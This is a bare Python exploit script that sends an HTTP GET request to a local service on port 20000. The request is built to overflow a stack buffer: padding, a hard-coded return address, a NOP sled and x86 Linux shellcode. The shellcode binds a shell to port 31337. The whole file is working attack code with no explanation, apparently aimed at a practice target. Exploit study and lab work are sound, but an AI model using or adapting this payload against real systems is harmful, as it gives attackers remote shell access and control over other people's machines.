#!/usr/bin/python
import socket
import struct

sc = "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"

HOST = '127.0.0.1'
PORT = 20000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

retl = 0xbf86fab8 + 140 + 20

payload = 'GET '
payload += 'A' * 139
payload += struct.pack('<L', retl)
#payload += 'DDDD'
payload += ' HTTP/1.1 '
payload += '\x90' * 100
payload += sc

s.send(payload)
data = s.recv(1024)
s.close()

print('Returned data: {0}'.format(data))

with open('payload', 'w') as fd:
    fd.write(payload)

